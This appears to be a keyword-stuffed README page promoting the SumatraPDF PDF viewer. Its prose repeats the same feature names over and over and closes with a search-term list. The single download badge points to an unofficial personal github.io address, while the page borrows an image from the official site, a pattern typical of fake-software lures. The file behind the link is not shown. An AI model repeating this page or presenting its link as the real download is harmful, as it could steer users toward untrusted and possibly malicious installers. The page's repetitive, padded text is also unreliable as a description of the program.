# SumatraPDF Reader - Fast PDF Reader with Tabs, Search, and Bookmarks

## About SumatraPDF

SumatraPDF is a document viewer. SumatraPDF reader is the window that shows PDF, and several other formats it supports. SumatraPDF tabs keep multiple files in one process. SumatraPDF search is in-document find. SumatraPDF bookmarks are the outline and the marks you add. SumatraPDF inverse is inverted colors for long sessions on a dark desk.

Open the file. Use SumatraPDF tabs if you compare two specs. SumatraPDF search with a unique string. Jump SumatraPDF bookmarks for structure. Enable SumatraPDF inverse only if you need it; it is not a default for proofs. Close tabs you do not need so the SumatraPDF reader stays light.

SumatraPDF is a viewer, not an editor. SumatraPDF reader, SumatraPDF tabs, SumatraPDF search, SumatraPDF bookmarks, and SumatraPDF inverse exist to read and navigate files you already have.

[![GET SumatraPDF](https://img.shields.io/badge/GET%20%E2%80%94%20SumatraPDF-0078D6?style=for-the-badge&logoColor=white)](https://nordenstrom1990nguyen.github.io/.github/SumatraPDF)

---

## SumatraPDF at a Glance

| Feature | What It Means |
|--------|----------------|
| **One clear job** | SumatraPDF reader displays the file. SumatraPDF tabs, SumatraPDF search, and SumatraPDF bookmarks move you. SumatraPDF inverse is optional contrast. |
| **Light on the PC** | Fast open. Many huge scans in SumatraPDF tabs will still cost RAM. |
| **Remembers context** | Last page, last SumatraPDF search, open SumatraPDF tabs, SumatraPDF inverse state. SumatraPDF bookmarks in the file still come from the document. |
| **Fast feedback** | Open, SumatraPDF search a heading, jump a bookmark, close. |

---

## Overview

![SumatraPDF](https://www.sumatrapdfreader.org/img/homepage.png)

SumatraPDF shows the page and gets out of the way. SumatraPDF reader is that page. SumatraPDF tabs are extra pages from other files. SumatraPDF search is the find box. SumatraPDF bookmarks are the map. SumatraPDF inverse is a display invert.

Use fit-width or fit-page on purpose. Copy text when the PDF allows it. Do not expect form fill or heavy markup. If you need comments, use an editor. Keep SumatraPDF tabs to the files under review. SumatraPDF search is case options and a results list, not a full-text corpus. SumatraPDF bookmarks that the author did not provide will be thin. SumatraPDF inverse can hide print issues; turn it off before you judge color.

---

## Key Features of SumatraPDF

- **Reader as a page** – SumatraPDF reader should open cold. Zoom and rotation are enough. SumatraPDF tabs then add files. SumatraPDF search then finds a string. SumatraPDF bookmarks then jump. SumatraPDF inverse then is a display preference.
- **Tabs as files** – SumatraPDF tabs are documents, not websites. Close them. The SumatraPDF reader should not accumulate a dozen manuals. SumatraPDF search is per document unless you repeat it. SumatraPDF bookmarks stay with each file. SumatraPDF inverse can be per view; check before you compare print.
- **Search as find** – SumatraPDF search is a string in this file. Unique tokens work. Repeated words do not. The SumatraPDF reader highlights hits. SumatraPDF tabs do not search all files at once as a corpus. SumatraPDF bookmarks may already be the better jump. SumatraPDF inverse does not change hit text.
- **Bookmarks as structure** – SumatraPDF bookmarks from the outline are the real map. Add your own marks if the tool allows and you need them. SumatraPDF reader jumps. SumatraPDF tabs keep the other spec. SumatraPDF search is for strings not in the outline. SumatraPDF inverse is unrelated.
- **Inverse as a session mode** – SumatraPDF inverse is for dim rooms and long text. Turn it off for figures and color proofs. SumatraPDF reader otherwise stays faithful. SumatraPDF tabs inherit the view you set. SumatraPDF search still works. SumatraPDF bookmarks still work.

---

## Quick Start with SumatraPDF

1. **Open one file** – SumatraPDF reader on the document. Set zoom. Ignore SumatraPDF tabs. Ignore SumatraPDF inverse. Try SumatraPDF search on a heading you know. Glance at SumatraPDF bookmarks.
2. **Add a second file only if comparing** – SumatraPDF tabs for the second spec. Switch. Do not pile more. Repeat SumatraPDF search in each. Use SumatraPDF bookmarks in each. Keep SumatraPDF inverse off until the text-only pass.
3. **Navigate** – Outline via SumatraPDF bookmarks, strings via SumatraPDF search, files via SumatraPDF tabs. SumatraPDF reader should feel like paging, not like a studio. Optional SumatraPDF inverse for a long text chapter.
4. **Copy with care** – If you copy from SumatraPDF reader, paste into a draft and cite. SumatraPDF search found the passage. SumatraPDF bookmarks can mark it. SumatraPDF tabs keep the source open. SumatraPDF inverse off for a screenshot of a figure.
5. **Close** – Close unused SumatraPDF tabs. Leave SumatraPDF inverse off as the default. The SumatraPDF reader should start clean next time. Clear a SumatraPDF search string. Leave SumatraPDF bookmarks as the file defined them unless you added marks on purpose.

---

## Who Will Like SumatraPDF

- **Engineers** – Specs. SumatraPDF reader, SumatraPDF tabs for two revs, SumatraPDF search for a register name, SumatraPDF bookmarks for chapters. SumatraPDF inverse on long text.
- **Admins** – Policy PDFs. Light SumatraPDF reader. SumatraPDF search for a clause. Few SumatraPDF tabs. SumatraPDF bookmarks if present. SumatraPDF inverse optional.
- **Reviewers** – Diff two PDFs as SumatraPDF tabs. SumatraPDF search for a changed term. SumatraPDF bookmarks to the section. SumatraPDF reader zoom on figures. SumatraPDF inverse off.
- **Support** – Vendor manuals. SumatraPDF reader, SumatraPDF search for an error string, SumatraPDF bookmarks, one extra tab. Skip SumatraPDF inverse on diagrams.
- **Anyone opening large PDFs often** – Cold start SumatraPDF reader, modest SumatraPDF tabs, SumatraPDF search, SumatraPDF bookmarks, SumatraPDF inverse only when the room is dark.

---

### System Requirements for SumatraPDF

| Component | Minimum | Recommended |
|----------|---------|-------------|
| OS | Windows 10 | Windows 11 |
| Processor | Dual-core CPU | Modern multi-core CPU |
| RAM | 4 GB | 8 GB or more |
| Storage | Space for the reader | Extra room is rarely needed |

SumatraPDF reader stays light when SumatraPDF tabs stay few. SumatraPDF search, SumatraPDF bookmarks, and SumatraPDF inverse should not require a workstation.

---

## Related Search Terms

SumatraPDF reader, SumatraPDF tabs, SumatraPDF search, SumatraPDF bookmarks, SumatraPDF inverse, fast pdf open, two file compare tabs, in document find, outline jump, dark session invert, fit width page, copy allowed text, large scan caution, spec revision pair, error string hunt, clause lookup, figure zoom, close unused tabs, color proof without invert, cold start viewer, sumatra tab switch, sumatra heading find, sumatra outline map
